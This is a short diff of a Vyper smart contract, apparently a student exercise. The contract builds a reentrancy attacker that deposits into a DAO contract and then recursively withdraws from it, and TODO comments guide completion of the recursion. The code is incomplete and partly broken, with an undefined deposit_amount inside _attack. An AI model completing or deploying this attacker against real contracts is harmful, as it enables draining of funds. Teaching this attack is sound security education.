@@ -10,6 +10,7 @@ owner_address: public(address)
 def __init__():
     self.dao_address = empty(address)
     self.owner_address = empty(address)
+    self.userBalances = 0  
 
 @internal
 def _attack() -> bool:
@@ -18,18 +19,17 @@ def _attack() -> bool:
     # TODO: Use the DAO interface to withdraw funds.
     # Make sure you add a "base case" to end the recursion
     if self.dao_address.balance == 0:
-        return true
+        return True
     dao_address.withdraw(deposit_amount)
 
-    return true
+    return True
 
 @external
 @payable
 def attack(dao_address:address):
     self.dao_address = dao_address
     deposit_amount: uint256 = msg.value
-    self.owner_address = msg.sender
-    self.userBalances = 0   
+    self.owner_address = msg.sender 
  
     # Attack cannot withdraw more than what exists in the DAO
     if dao_address.balance < msg.value:
